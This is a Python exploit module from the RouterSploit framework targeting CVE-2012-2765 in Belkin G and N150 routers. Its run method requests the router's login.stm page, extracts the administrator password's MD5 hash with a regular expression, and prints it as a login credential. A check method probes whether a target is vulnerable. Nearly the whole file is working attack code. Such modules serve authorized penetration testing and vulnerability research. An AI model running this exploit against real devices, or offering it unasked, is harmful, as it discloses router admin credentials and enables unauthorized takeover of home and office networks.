import re

from routersploit import (
    exploits,
    print_error,
    print_success,
    print_table,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Belkin G and N150 Password MD5 Disclosure vulnerability.
    If the target is vulnerable, password in MD5 format is returned.
    """
    __info__ = {
        'name': 'Belkin G & N150 Password Disclosure',
        'description': 'Module exploits Belkin G and N150 Password MD5 Disclosure vulnerability which allows fetching administration\'s password in md5 format',
        'authors': [
            'Aodrulez <f3arm3d3ar[at]gmail.com>',  # vulnerability discovery
            'Avinash Tangirala',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2765',
            'https://www.exploit-db.com/exploits/17349/',
        ],
        'devices': [
            'Belkin G',
            'Belkin N150',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        url = "{}:{}/login.stm".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return

        val = re.findall('password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            print_success("Exploit success")
            data = [('admin', val[0])]
            headers = ("Login", "MD5 Password")
            print_table(headers, *data)

        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    @mute
    def check(self):
        url = "{}:{}/login.stm".format(self.target, self.port)

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        val = re.findall('password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            return True  # target vulnerable

        return False  # target is not vulnerable
